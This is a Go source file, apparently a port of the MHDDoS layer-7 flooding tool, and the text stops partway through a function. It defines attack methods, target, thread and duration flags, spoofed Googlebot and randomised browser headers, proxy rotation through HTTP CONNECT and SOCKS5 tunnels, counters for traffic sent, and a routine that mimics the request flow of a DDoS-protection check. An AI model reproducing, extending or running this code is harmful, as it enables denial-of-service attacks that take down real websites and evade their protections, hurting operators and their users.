package main

import (
	"bufio"
	"bytes"
	"context"
	"crypto/tls"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"errors"
	"flag"
	"fmt"
	"io"
	"log"
	"math"
	mrand "math/rand" // Use mrand alias to avoid conflict with crypto/rand
	"net"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"os"
	"os/exec"
	"os/signal"
	"path/filepath"
	"regexp"
	"runtime"
	"sort"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"

	"golang.org/x/net/proxy"
)

const version = "2.4 SNAPSHOT (L7 Only Mod) [Go Port]"

// --- Global Variables & Flags ---
var (
	// Flags
	methodFlag         = flag.String("method", "", "Attack method (e.g., GET, POST, CFB, SLOW)")
	urlFlag            = flag.String("url", "", "Target URL (e.g., http://example.com)")
	threadsFlag        = flag.Int("threads", 100, "Number of concurrent attack threads")
	proxyFileFlag      = flag.String("proxyfile", "files/proxies/http.txt", "Path to the proxy list file (relative to script dir)")
	rpcFlag            = flag.Int("rpc", 50, "Requests Per Connection/Concurrency Factor")
	durationFlag       = flag.Int("duration", 60, "Attack duration in seconds")
	cookieFlag         = flag.String("cookie", "", "[Optional] Cookie string (e.g., 'name=value; name2=value2')")
	debugFlag          = flag.Bool("debug", false, "[Optional] Enable debug logging")
	bombardierPathFlag = flag.String("bombardier", "", "[Optional] Path to bombardier executable (if not in PATH or default Go bin)")

	// Globals
	requestsSent uint64
	bytesSent    uint64
	startTime    time.Time
	scriptDir    string
	configData   map[string]interface{} // Keep config loading, might be harmless or used subtly
	logger       *log.Logger
	ipRegex      = regexp.MustCompile(`(?:\d{1,3}\.){3}\d{1,3}`)

	// Header Randomization Data (initialized in init)
	userAgents           []string
	referers             []string
	acceptEncodingValues []string
	acceptLanguageValues []string
	cacheControlValues   []string
	connectionValues     []string
	googleAgents         = []string{
		"Mozila/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
		"Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)) Googlebot/2.1 (+http://www.google.com/bot.html)",
		"Googlebot/2.1 (+http://www.googlebot.com/bot.html)",
	}
	tor2webs = []string{
		"onion.city", "onion.cab", "onion.direct", "onion.sh", "onion.link",
		"onion.ws", "onion.pet", "onion.rip", "onion.plus", "onion.top",
		"onion.si", "onion.ly", "onion.my", "onion.lu", "onion.casa", "onion.com.de",
		"onion.foundation", "onion.rodeo", "onion.lat", "tor2web.org", "tor2web.fi",
		"tor2web.blutmagie.de", "tor2web.to", "tor2web.io", "tor2web.in",
		"tor2web.it", "tor2web.xyz", "tor2web.su", "darknet.to", "s1.tor-gateways.de",
		"s2.tor-gateways.de", "s3.tor-gateways.de", "s4.tor-gateways.de", "s5.tor-gateways.de",
	}
)

// --- Methods Definition ---
var LAYER7_METHODS = map[string]struct{}{
	"CFB": {}, "BYPASS": {}, "GET": {}, "POST": {}, "OVH": {}, "STRESS": {}, "DYN": {}, "SLOW": {}, "HEAD": {},
	"NULL": {}, "COOKIE": {}, "PPS": {}, "EVEN": {}, "GSB": {}, "DGB": {}, "AVB": {}, "CFBUAM": {},
	"APACHE": {}, "XMLRPC": {}, "BOT": {}, "BOMB": {}, "DOWNLOADER": {}, "KILLER": {}, "TOR": {}, "RHEX": {}, "STOMP": {},
}

// --- Counter Abstraction (using atomic internally) ---
type Counter struct {
	value uint64
}

func NewCounter(initialValue uint64) *Counter {
	return &Counter{value: initialValue}
}
func (c *Counter) Add(delta uint64) {
	atomic.AddUint64(&c.value, delta)
}
func (c *Counter) Get() uint64 {
	return atomic.LoadUint64(&c.value)
}
func (c *Counter) Set(value uint64) {
	atomic.StoreUint64(&c.value, value)
}
func (c *Counter) Reset() uint64 {
	return atomic.SwapUint64(&c.value, 0)
}

var (
	REQUESTS_SENT_COUNTER = NewCounter(0)
	BYTES_SENT_COUNTER    = NewCounter(0)
)

// --- bcolors (ANSI Escape Codes) ---
type Bcolors struct {
	HEADER    string
	OKBLUE    string
	OKCYAN    string
	OKGREEN   string
	WARNING   string
	FAIL      string
	RESET     string
	BOLD      string
	UNDERLINE string
}

var colors = Bcolors{
	HEADER:    "\033[95m",
	OKBLUE:    "\033[94m",
	OKCYAN:    "\033[96m",
	OKGREEN:   "\033[92m",
	WARNING:   "\033[93m",
	FAIL:      "\033[91m",
	RESET:     "\033[0m",
	BOLD:      "\033[1m",
	UNDERLINE: "\033[4m",
}

// --- Initialization ---
func init() {
	var err error
	// Get script directory
	ex, err := os.Executable()
	if err != nil {
		panic(fmt.Sprintf("Cannot get executable path: %v", err))
	}
	scriptDir = filepath.Dir(ex)

	// Setup Logger (will be configured further in main based on debug flag)
	logger = log.New(os.Stderr, "", 0)
	log.SetOutput(io.Discard) // Discard default logger output

	// Load config.json (best effort)
	configPath := filepath.Join(scriptDir, "config.json")
	configFile, err := os.Open(configPath)
	if err != nil {
		if !errors.Is(err, os.ErrNotExist) { // Log warning only if file exists but cannot be opened
			logger.Printf("%sWarning: Could not open config.json: %v%s", colors.WARNING, err, colors.RESET)
		}
	} else {
		defer configFile.Close()
		decoder := json.NewDecoder(configFile)
		err = decoder.Decode(&configData)
		if err != nil {
			logger.Printf("%sWarning: Could not decode config.json: %v%s", colors.WARNING, err, colors.RESET)
		}
	}

	// Seed random number generator
	mrand.Seed(time.Now().UnixNano())

	// Initialize Header Randomization Lists
	acceptEncodingValues = []string{
		"gzip, deflate, br", "gzip, deflate", "br, gzip, deflate", "gzip", "br", "*",
	}
	acceptLanguageValues = []string{
		"en-US,en;q=0.9", "en-GB,en;q=0.9,en-US;q=0.8", "fr-FR,fr;q=0.9,en;q=0.8",
		"es-ES,es;q=0.9,en;q=0.8", "de-DE,de;q=0.9,en;q=0.8", "ru-RU,ru;q=0.9,en;q=0.8",
		"ja-JP,ja;q=0.9,en;q=0.8",
	}
	cacheControlValues = []string{
		"max-age=0", "no-cache", "no-store", "no-store, no-cache", "public, max-age=604800",
	}
	connectionValues = []string{
		"keep-alive", "close",
	}

	// Load User Agents and Referers (moved from main to init)
	userAgents = loadListFromFile("useragent.txt", "User agent")
	referers = loadListFromFile("referers.txt", "Referer")
}

// --- Logging ---
func logDebugf(format string, v ...interface{}) {
	if *debugFlag {
		// Include goroutine ID for debugging concurrency
		buf := make([]byte, 64)
		n := runtime.Stack(buf, false)
		stackInfo := strings.Fields(string(buf[:n]))
		gid := " GID:?"
		if len(stackInfo) > 1 {
			gid = fmt.Sprintf(" GID:%s", stackInfo[1])
		}
		logger.Printf("[DEBUG%s] "+format, append([]interface{}{gid}, v...)...)
	}
}

func info(message ...string) {
	logger.Printf("%s%s%s", colors.OKCYAN, strings.Join(message, " "), colors.RESET)
}

func warning(message ...string) {
	logger.Printf("%s%s%s", colors.WARNING, strings.Join(message, " "), colors.RESET)
}

func fatal(message ...string) {
	if len(message) > 0 {
		logger.Printf("%s%s%s", colors.FAIL, strings.Join(message, " "), colors.RESET)
	}
	os.Exit(1)
}

// --- File Loading Utility ---
func loadListFromFile(filename string, fileType string) []string {
	path := filepath.Join(scriptDir, "files", filename)
	file, err := os.Open(path)
	if err != nil {
		// Attempt to create default files if they don't exist
		if errors.Is(err, os.ErrNotExist) {
			warning(fmt.Sprintf("%s file not found at '%s'. Attempting to create default.", fileType, path))
			if errCreate := createDefaultListFile(path, filename); errCreate != nil {
				fatal(fmt.Sprintf("Failed to create default %s file '%s': %v", fileType, path, errCreate))
			}
			// Try opening again after creation
			file, err = os.Open(path)
			if err != nil {
				fatal(fmt.Sprintf("Still cannot open %s file '%s' after creation attempt: %v", fileType, path, err))
			}
		} else {
			fatal(fmt.Sprintf("Error opening %s file '%s': %v", fileType, path, err))
		}
	}
	defer file.Close()

	var lines []string
	scanner := bufio.NewScanner(file)
	lineNum := 0
	for scanner.Scan() {
		lineNum++
		line := strings.TrimSpace(scanner.Text())
		if line != "" && !strings.HasPrefix(line, "#") {
			lines = append(lines, line)
		}
	}
	if err := scanner.Err(); err != nil {
		fatal(fmt.Sprintf("Error reading %s file '%s': %v", fileType, path, err))
	}
	if len(lines) == 0 {
		warning(fmt.Sprintf("Warning: Empty %s File: %s. Attack might be ineffective.", fileType, path))
		// Add a single default entry to prevent crashes in randChoice
		if filename == "useragent.txt" {
			lines = append(lines, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36")
		} else if filename == "referers.txt" {
			lines = append(lines, "https://www.google.com/")
		}
	}
	logDebugf("Loaded %d entries from %s", len(lines), path)
	return lines
}

// Creates default useragent.txt or referers.txt if missing
func createDefaultListFile(path, filename string) error {
	dir := filepath.Dir(path)
	if err := os.MkdirAll(dir, 0755); err != nil {
		return fmt.Errorf("failed to create directory %s: %w", dir, err)
	}

	var defaultContent string
	if filename == "useragent.txt" {
		defaultContent = `# Common User Agents (add more for variety)
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15
Mozilla/5.0 (X11; Linux x86_64; rv:108.0) Gecko/20100101 Firefox/108.0
`
	} else if filename == "referers.txt" {
		defaultContent = `# Common Referers (add more for variety)
https://www.google.com/
https://duckduckgo.com/
https://www.bing.com/
https://yandex.com/
https://search.yahoo.com/
`
	} else {
		// Create empty file for other types
		defaultContent = "# Add entries here\n"
	}

	err := os.WriteFile(path, []byte(defaultContent), 0644)
	if err != nil {
		return fmt.Errorf("failed to write default content to %s: %w", path, err)
	}
	info(fmt.Sprintf("Created default file at '%s'", path))
	return nil
}


// --- Utilities (Tools Equivalent) ---
func humanBytes(i uint64, binary bool, precision int) string {
	multiples := []string{"B", "k{}B", "M{}B", "G{}B", "T{}B", "P{}B", "E{}B", "Z{}B", "Y{}B"}
	base := uint64(1000)
	if binary {
		base = 1024
	}
	if i == 0 {
		return fmt.Sprintf("%*s B", precision+4, "--") // Ensure alignment
	}

	multiple := 0
	if i > 0 && base > 1 {
		// Calculate logarithm base 'base' using Log2
		logVal := math.Log2(float64(i)) / math.Log2(float64(base))
		multiple = int(math.Floor(logVal)) // Use Floor instead of Trunc
	}

	// Prevent index out of bounds if i is extremely large
	if multiple >= len(multiples) {
		multiple = len(multiples) - 1
	}
	if multiple < 0 { multiple = 0 } // Handle very small numbers if needed

	value := float64(i) / math.Pow(float64(base), float64(multiple))
	suffixFormat := multiples[multiple]
	suffix := ""
	if binary {
		suffix = strings.Replace(suffixFormat, "{}", "i", 1)
	} else {
		suffix = strings.Replace(suffixFormat, "{}", "", 1)
	}
	return fmt.Sprintf("%.*f %s", precision, value, suffix)
}

func humanFormat(num uint64, precision int) string {
	suffixes := []string{"", "k", "m", "g", "t", "p"}
	if num < 1000 {
		return fmt.Sprintf("%d", num)
	}

	magnitude := math.Log10(float64(num))
	obje := int(math.Floor(magnitude / 3.0)) // Index into suffixes

	if obje >= len(suffixes) {
		obje = len(suffixes) - 1 // Cap at highest suffix
	}
	if obje < 0 { obje = 0 }

	val := float64(num) / math.Pow(1000.0, float64(obje))
	return fmt.Sprintf("%.*f%s", precision, val, suffixes[obje])
}

// sizeOfRequest estimates the size of an HTTP request based on Go's http.Request
// Approximation mirroring Python's logic (Request Line + Headers + Body Length).
func sizeOfRequest(req *http.Request) uint64 {
	var size uint64
	var buf bytes.Buffer

	// Write request line and headers to buffer to estimate size
	err := req.WriteProxy(&buf) // WriteProxy includes Host header, Write includes it if not default port
	if err != nil {
		// Fallback calculation if WriteProxy fails (should be rare)
		size += uint64(len(req.Method) + len(req.URL.RequestURI()) + len(req.Proto) + 4) // Method SP URI SP Proto CRLF
		for k, vv := range req.Header {
			for _, v := range vv {
				size += uint64(len(k) + len(v) + 4) // Key: SP Value CRLF
			}
		}
		size += 2 // Final CRLF after headers
	} else {
		size = uint64(buf.Len())
	}

	// Add body size (ContentLength is the best indicator available before sending)
	if req.ContentLength > 0 {
		size += uint64(req.ContentLength)
	}

	return size
}

// send writes data to a net.Conn and updates global counters.
func send(conn net.Conn, packet []byte, threadID int) (bool, error) {
	logDebugf("[Thread %d] Sending %d bytes", threadID, len(packet))
	// Set write deadline to prevent hangs
	conn.SetWriteDeadline(time.Now().Add(10 * time.Second)) // 10s write timeout
	n, err := conn.Write(packet)
	conn.SetWriteDeadline(time.Time{}) // Clear deadline

	if err != nil {
		// Don't log common errors like broken pipe here in non-debug mode, let caller handle.
		logDebugf("[Thread %d] Send error: %v", threadID, err)
		return false, err // Return error for caller to handle
	}
	if n != len(packet) {
		logDebugf("[Thread %d] Short write: sent %d, expected %d", threadID, n, len(packet))
		return false, io.ErrShortWrite
	}
	BYTES_SENT_COUNTER.Add(uint64(len(packet)))
	REQUESTS_SENT_COUNTER.Add(1)
	logDebugf("[Thread %d] Sent %d bytes successfully to %s", threadID, n, conn.RemoteAddr())
	return true, nil
}

// safeClose closes a net.Conn, ignoring errors.
func safeClose(conn net.Conn, threadID int) {
	if conn != nil {
		logDebugf("[Thread %d] Closing connection to %s", threadID, conn.RemoteAddr())
		conn.Close()
	}
}

// --- Random Helpers ---
func randIPv4() string {
	// Ensure random parts are generated freshly each time
	// mrand is already seeded in init()
	return fmt.Sprintf("%d.%d.%d.%d", mrand.Intn(256), mrand.Intn(256), mrand.Intn(256), mrand.Intn(256))
}

func randStr(length int) string {
	const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	b := make([]byte, length)
	for i := range b {
		b[i] = charset[mrand.Intn(len(charset))]
	}
	return string(b)
}

func randInt(min, max int) int {
	if min >= max {
		// Return min to avoid panic in Intn(0) or negative range
		return min
	}
	return mrand.Intn(max-min+1) + min
}

func randBytes(n int) ([]byte, error) {
	b := make([]byte, n)
	_, err := mrand.Read(b) // Use math/rand which is seeded, crypto/rand not needed here
	if err != nil {
		return nil, fmt.Errorf("failed to generate random bytes: %w", err)
	}
	return b, nil
}

// randChoice selects a random element from a string slice.
func randChoice(s []string) string {
	if len(s) == 0 {
		warning("randChoice called with empty slice, returning empty string") // Warn if this happens
		return ""
	}
	return s[mrand.Intn(len(s))]
}

// randChoiceInt selects a random element from an int slice.
func randChoiceInt(s []int) int {
	if len(s) == 0 {
		warning("randChoiceInt called with empty slice, returning 0") // Warn if this happens
		return 0 // Or handle error appropriately
	}
	return s[mrand.Intn(len(s))]
}

// --- Proxy Handling ---
type ProxyType int

const (
	HTTP ProxyType = iota
	SOCKS4
	SOCKS5
	Unknown
)

type Proxy struct {
	Host     string
	Port     string
	Username string // Optional
	Password string // Optional
	Type     ProxyType
	Original string // Original string representation
}

// parseProxy parses a proxy string (e.g., host:port, user:pass@host:port)
func parseProxy(proxyStr string) (*Proxy, error) {
	proxyStr = strings.TrimSpace(proxyStr)
	if proxyStr == "" {
		return nil, errors.New("empty proxy string")
	}

	p := &Proxy{Original: proxyStr}

	// Check for URI scheme (e.g., socks5://, http://)
	if strings.Contains(proxyStr, "://") {
		proxyURL, err := url.Parse(proxyStr)
		if err != nil {
			return nil, fmt.Errorf("invalid proxy URI '%s': %w", proxyStr, err)
		}

		switch strings.ToLower(proxyURL.Scheme) {
		case "http", "https": // Treat https proxy as http tunnel
			p.Type = HTTP
		case "socks5", "socks5h":
			p.Type = SOCKS5
		case "socks4", "socks4a":
			p.Type = SOCKS4
		default:
			// Fallback to consider it HTTP if scheme unknown? Or fail? Let's fail.
			return nil, fmt.Errorf("unsupported proxy scheme '%s' in '%s'", proxyURL.Scheme, proxyStr)
			// p.Type = HTTP // Or default to HTTP?
			// logDebugf("Unsupported proxy scheme '%s' in '%s', assuming HTTP", proxyURL.Scheme, proxyStr)
		}

		p.Host = proxyURL.Hostname()
		p.Port = proxyURL.Port()
		if p.Port == "" {
			// Assign default ports based on scheme
			switch p.Type {
			case HTTP:
				p.Port = "80" // Default HTTP port
			case SOCKS5, SOCKS4:
				p.Port = "1080" // Default SOCKS port
			}
		}

		if user := proxyURL.User; user != nil {
			p.Username = user.Username()
			if pass, ok := user.Password(); ok {
				p.Password = pass
			}
		}

	} else {
		// Assume host:port or user:pass@host:port format without scheme
		parts := strings.Split(proxyStr, "@")
		var hostPort string
		if len(parts) == 2 { // Contains user:pass
			userPass := strings.Split(parts[0], ":")
			if len(userPass) == 2 {
				p.Username = userPass[0]
				p.Password = userPass[1]
				hostPort = parts[1]
			} else {
				// Invalid user:pass format, maybe it's host:port?
				hostPort = proxyStr // Re-evaluate the whole string
			}
		} else if len(parts) == 1 { // No user:pass
			hostPort = parts[0]
		} else {
			return nil, fmt.Errorf("invalid proxy format: multiple '@' symbols in '%s'", proxyStr)
		}

		// Split host and port
		host, port, err := net.SplitHostPort(hostPort)
		if err != nil {
			// Check if it's just a hostname (e.g., localhost)
			if addrErr, ok := err.(*net.AddrError); ok && strings.Contains(addrErr.Err, "missing port") {
				// Could assume default port? Risky without scheme.
				// Let's require host:port format if no scheme.
				return nil, fmt.Errorf("invalid proxy format '%s': missing port (use host:port or scheme://host:port)", proxyStr)
			}
			// Other split error
			return nil, fmt.Errorf("invalid proxy format in '%s': %w", hostPort, err)
		}
		p.Host = host
		p.Port = port

		// *** Infer Proxy Type (Simple Guess based on typical usage) ***
		// If not specified via scheme, default to HTTP. This is less reliable.
		p.Type = HTTP // Default inference
		// Could add port-based guessing (e.g., 1080 -> SOCKS) if needed.
	}

	// Validate parsed parts
	if p.Host == "" || p.Port == "" {
		return nil, fmt.Errorf("failed to parse host or port from proxy string '%s'", proxyStr)
	}

	return p, nil
}

// lformatted returns the proxy string in scheme://user:pass@host:port format
func (p *Proxy) lformatted() string {
	var scheme string
	switch p.Type {
	case HTTP:
		scheme = "http"
	case SOCKS4:
		scheme = "socks4" // Note: SOCKS4 support might be limited
	case SOCKS5:
		scheme = "socks5"
	default:
		scheme = "http" // Default unknown to http
	}

	userInfo := ""
	if p.Username != "" {
		userInfo = url.UserPassword(p.Username, p.Password).String() + "@"
	}

	return fmt.Sprintf("%s://%s%s:%s", scheme, userInfo, p.Host, p.Port)
}

// openSocket establishes a TCP connection, potentially through the proxy.
// Uses golang.org/x/net/proxy for SOCKS and manual HTTP CONNECT.
func (p *Proxy) openSocket(network, addr string, threadID int, timeout time.Duration) (net.Conn, error) {
	logDebugf("[Thread %d] Opening socket to %s via proxy %s (%s)", threadID, addr, p.Original, p.Type)

	proxyAddr := net.JoinHostPort(p.Host, p.Port)
	var dialer proxy.Dialer = &net.Dialer{Timeout: timeout} // Use proxy.Direct for HTTP CONNECT or no proxy
	var err error

	if p.Type == SOCKS5 {
		auth := (*proxy.Auth)(nil)
		if p.Username != "" {
			auth = &proxy.Auth{
				User:     p.Username,
				Password: p.Password,
			}
		}
		dialer, err = proxy.SOCKS5("tcp", proxyAddr, auth, dialer)
		if err != nil {
			logDebugf("[Thread %d] Failed to create SOCKS5 dialer for proxy %s: %v", threadID, p.Original, err)
			return nil, fmt.Errorf("SOCKS5 dialer setup failed for %s: %w", p.Original, err)
		}
		logDebugf("[Thread %d] Attempting SOCKS5 dial to %s via %s", threadID, addr, proxyAddr)
		conn, err := dialer.Dial(network, addr)
		if err != nil {
			logDebugf("[Thread %d] SOCKS5 dial to %s via %s failed: %v", threadID, addr, p.Original, err)
			return nil, fmt.Errorf("SOCKS5 dial failed via %s: %w", p.Original, err)
		}
		logDebugf("[Thread %d] SOCKS5 connection established to %s via %s", threadID, addr, p.Original)
		return conn, nil
	}

	if p.Type == SOCKS4 {
		// The proxy package used (`golang.org/x/net/proxy`) does not have explicit SOCKS4 support comparable to its SOCKS5 support.
		logDebugf("[Thread %d] SOCKS4 proxy type is not supported by the current implementation (%s).", threadID, p.Original)
		return nil, fmt.Errorf("SOCKS4 proxy type not supported: %s", p.Original)
		// If SOCKS4 support is strictly required, a different library or manual implementation would be needed.
	}

	if p.Type == HTTP {
		// Manual HTTP CONNECT implementation
		logDebugf("[Thread %d] Attempting HTTP CONNECT to %s via %s", threadID, addr, proxyAddr)
		proxyConn, err := dialer.Dial("tcp", proxyAddr) // dialer here is net.Dialer
		if err != nil {
			logDebugf("[Thread %d] Failed to connect to HTTP proxy %s: %v", threadID, proxyAddr, err)
			return nil, fmt.Errorf("failed to connect to HTTP proxy %s: %w", proxyAddr, err)
		}

		// Send CONNECT request
		connectReqStr := fmt.Sprintf("CONNECT %s HTTP/1.1\r\nHost: %s\r\n", addr, addr)
		if p.Username != "" {
			auth := p.Username + ":" + p.Password
			basicAuth := "Basic " + base64.StdEncoding.EncodeToString([]byte(auth))
			connectReqStr += "Proxy-Authorization: " + basicAuth + "\r\n"
		}
		connectReqStr += "Proxy-Connection: Keep-Alive\r\n" // Some proxies need this
		connectReqStr += "User-Agent: MHDDoS-Go-Client\r\n"  // Minimal UA for CONNECT
		connectReqStr += "\r\n"

		logDebugf("[Thread %d] Sending CONNECT request:\n%s", threadID, connectReqStr)
		proxyConn.SetWriteDeadline(time.Now().Add(timeout))
		_, err = proxyConn.Write([]byte(connectReqStr))
		proxyConn.SetWriteDeadline(time.Time{}) // Clear deadline
		if err != nil {
			safeClose(proxyConn, threadID)
			logDebugf("[Thread %d] Failed to send CONNECT request to proxy %s: %v", threadID, proxyAddr, err)
			return nil, fmt.Errorf("failed to send CONNECT to proxy %s: %w", proxyAddr, err)
		}

		// Read CONNECT response
		reader := bufio.NewReader(proxyConn)
		proxyConn.SetReadDeadline(time.Now().Add(timeout))
		statusLine, err := reader.ReadString('\n')
		proxyConn.SetReadDeadline(time.Time{}) // Clear deadline
		if err != nil {
			safeClose(proxyConn, threadID)
			logDebugf("[Thread %d] Failed to read CONNECT response from proxy %s: %v", threadID, proxyAddr, err)
			return nil, fmt.Errorf("failed to read CONNECT response from %s: %w", proxyAddr, err)
		}

		logDebugf("[Thread %d] Received CONNECT response: %s", threadID, strings.TrimSpace(statusLine))
		// Check status code (e.g., "HTTP/1.1 200 OK")
		if !strings.Contains(statusLine, " 200 ") {
			errMsg := fmt.Sprintf("proxy %s rejected CONNECT request: %s", proxyAddr, strings.TrimSpace(statusLine))
			// Read rest of headers for context
			proxyConn.SetReadDeadline(time.Now().Add(2 * time.Second)) // Short deadline for headers
			for {
				line, err := reader.ReadString('\n')
				if err != nil || strings.TrimSpace(line) == "" {
					break
				}
				errMsg += "\n" + strings.TrimSpace(line)
			}
			proxyConn.SetReadDeadline(time.Time{})
			safeClose(proxyConn, threadID)
			logDebugf("[Thread %d] %s", threadID, errMsg)
			return nil, fmt.Errorf(errMsg)
		}

		// Discard remaining headers
		proxyConn.SetReadDeadline(time.Now().Add(2 * time.Second))
		for {
			line, err := reader.ReadString('\n')
			if err != nil {
				if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
					logDebugf("[Thread %d] Timeout discarding CONNECT headers, assuming OK.", threadID)
					break // Timeout likely means end of headers or slow proxy
				}
				safeClose(proxyConn, threadID)
				logDebugf("[Thread %d] Error discarding headers after CONNECT response: %v", threadID, err)
				return nil, fmt.Errorf("error reading headers after CONNECT response: %w", err)
			}
			logDebugf("[Thread %d] Discarding CONNECT header: %s", threadID, strings.TrimSpace(line))
			if line == "\r\n" { // End of headers
				break
			}
		}
		proxyConn.SetReadDeadline(time.Time{})

		logDebugf("[Thread %d] HTTP CONNECT tunnel established to %s via %s", threadID, addr, p.Original)
		// Connection is now tunneled
		return proxyConn, nil
	}

	// Unknown or unsupported type
	return nil, fmt.Errorf("unsupported proxy type %v for direct socket connection", p.Type)
}

// handleProxyList reads proxies from a file, creates it if non-existent.
func handleProxyList(proxyFilePath string) []*Proxy {
	proxies := []*Proxy{}
	fullPath := proxyFilePath
	if !filepath.IsAbs(proxyFilePath) {
		fullPath = filepath.Join(scriptDir, proxyFilePath)
	}
	logDebugf("Attempting to load proxy list from: %s", fullPath)

	_, err := os.Stat(fullPath)
	if errors.Is(err, os.ErrNotExist) {
		warning(fmt.Sprintf("Proxy file '%s' not found. Creating empty file and running without proxies.", fullPath))
		// Ensure the directory exists
		dir := filepath.Dir(fullPath)
		if err := os.MkdirAll(dir, 0755); err != nil {
			fatal(fmt.Sprintf("Error creating proxy directory '%s': %v", dir, err))
		}
		// Create an empty file
		file, err := os.Create(fullPath)
		if err != nil {
			fatal(fmt.Sprintf("Error creating proxy file '%s': %v", fullPath, err))
		}
		file.Close() // Close immediately after creation
		info(fmt.Sprintf("Empty proxy file created at '%s'.", fullPath))
		return proxies // Return empty list
	}

	// File exists, try to read it
	file, err := os.Open(fullPath)
	if err != nil {
		warning(fmt.Sprintf("Error opening proxy file '%s': %v", fullPath, err))
		warning("Proceeding without proxies due to file open error.")
		return proxies // Return empty list on error
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	lineNum := 0
	proxyTypeCounts := make(map[ProxyType]int)
	for scanner.Scan() {
		lineNum++
		line := strings.TrimSpace(scanner.Text())
		if line == "" || strings.HasPrefix(line, "#") { // Skip empty lines and comments
			continue
		}
		proxy, err := parseProxy(line)
		if err != nil {
			logDebugf("Skipping invalid proxy on line %d of '%s': %v", lineNum, fullPath, err)
			continue
		}

		// If proxy type was not determined by scheme, infer based on filename
		// This provides compatibility with MHDDoS file naming convention.
		if proxy.Type == Unknown {
			lowerPath := strings.ToLower(proxyFilePath)
			if strings.Contains(lowerPath, "socks5") {
				proxy.Type = SOCKS5
			} else if strings.Contains(lowerPath, "socks4") {
				proxy.Type = SOCKS4
			} else {
				proxy.Type = HTTP // Default to HTTP if no scheme and filename doesn't suggest SOCKS
			}
			logDebugf("Inferred proxy type %v for %s based on filename %s", proxy.Type, proxy.Original, proxyFilePath)
		}

		// Skip SOCKS4 if found, as it's not supported in openSocket
		if proxy.Type == SOCKS4 {
			logDebugf("Skipping unsupported SOCKS4 proxy on line %d: %s", lineNum, proxy.Original)
			continue
		}

		proxies = append(proxies, proxy)
		proxyTypeCounts[proxy.Type]++
	}

	if err := scanner.Err(); err != nil {
		warning(fmt.Sprintf("Error reading proxy file '%s': %v", fullPath, err))
		warning("Proceeding with potentially incomplete proxy list.")
	}

	if len(proxies) > 0 {
		typeCountsStr := ""
		for pType, count := range proxyTypeCounts {
			typeCountsStr += fmt.Sprintf("%v:%d ", pType, count)
		}
		info(fmt.Sprintf("Proxy Count: %s%d%s (%s)", colors.OKBLUE, len(proxies), colors.RESET, strings.TrimSpace(typeCountsStr)))

	} else {
		warning(fmt.Sprintf("Empty or invalid Proxy File ('%s'), running flood without proxy", fullPath))
	}

	return proxies
}

// --- DGB Solver (Simplified net/http based) ---
// Mimics the request flow, DOES NOT solve JS challenges.
func dgbSolver(targetURL *url.URL, ua string, proxyURL *url.URL, cookie string, threadID int) (*http.Client, http.CookieJar) {
	logDebugf("[Thread %d] DGB Solver: Starting for %s", threadID, targetURL.String())
	jar, _ := cookiejar.New(nil) // Use a standard cookie jar

	// Use distinct transport to avoid interference with other methods' clients
	dgbTransport := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true}, // Mimic global TLS settings
		Proxy:           http.ProxyURL(proxyURL),
		DialContext: (&net.Dialer{
			Timeout:   10 * time.Second,
			KeepAlive: 30 * time.Second,
		}).DialContext,
		MaxIdleConns:          10, // Allow some reuse within solver
		IdleConnTimeout:       90 * time.Second,
		TLSHandshakeTimeout:   10 * time.Second,
		ExpectContinueTimeout: 1 * time.Second,
		ForceAttemptHTTP2:     true,
	}
	client := &http.Client{
		Timeout:   15 * time.Second, // Timeout for each step
		Transport: dgbTransport,
		Jar:       jar, // Use the jar
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse // Don't follow redirects automatically
		},
	}

	// Add provided cookie string to initial request if present
	// Note: This parses the input cookie string, which might be complex.
	// Simplification: Assume the cookie string is valid for a Cookie header.
	initialCookies := []*http.Cookie{}
	if cookie != "" {
		header := http.Header{}
		header.Add("Cookie", cookie)
		// Create a dummy request to parse cookies from header
		dummyReq := http.Request{Header: header}
		initialCookies = dummyReq.Cookies()
		if len(initialCookies) > 0 {
			client.Jar.SetCookies(targetURL, initialCookies)
			logDebugf("[Thread %d] DGB Solver: Added initial cookies from string: %v", threadID, initialCookies)
		} else {
			logDebugf("[Thread %d] DGB Solver: Could not parse initial cookies from string: %s", threadID, cookie)
		}
	}

	headers := make(http.Header)
	headers.Set("User-Agent", ua)
	headers.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8")
	headers.Set("Accept-Language", "en-US,en;q=0.5")
	headers.Set("Connection", "keep-alive")
	headers.Set("Sec-Fetch-Dest", "document")
	headers.Set("Sec-Fetch-Mode", "navigate")
	headers.Set("Sec-Fetch-Site", "none")
	headers.Set("Sec-Fetch-User", "?1")
	headers.Set("TE", "trailers")
	headers.Set("DNT", "1")
	headers.Set("Upgrade-Insecure-Requests", "1")

	// 1. Initial GET request to the target URL
	logDebugf("[Thread %d] DGB Solver: Step 1 - Initial GET to %s", threadID, targetURL.String())
	req, _ := http.NewRequest("GET", targetURL.String(), nil)
	req.Header = headers.Clone()

	resp, err := client.Do(req)
	if err != nil {
		logDebugf("[Thread %d] DGB Solver: Initial GET failed: %v", threadID, err)
		return nil, nil // Critical failure
	}
	logDebugf("[Thread %d] DGB Solver: Initial GET status: %s, Cookies: %v", threadID, resp.Status, client.Jar.Cookies(targetURL))
	io.Copy(io.Discard, resp.Body) // Read and discard body
	resp.Body.Close()

	// 2. POST request to check.js
	logDebugf("[Thread %d] DGB Solver: Step 2 - POST to check.js", threadID)
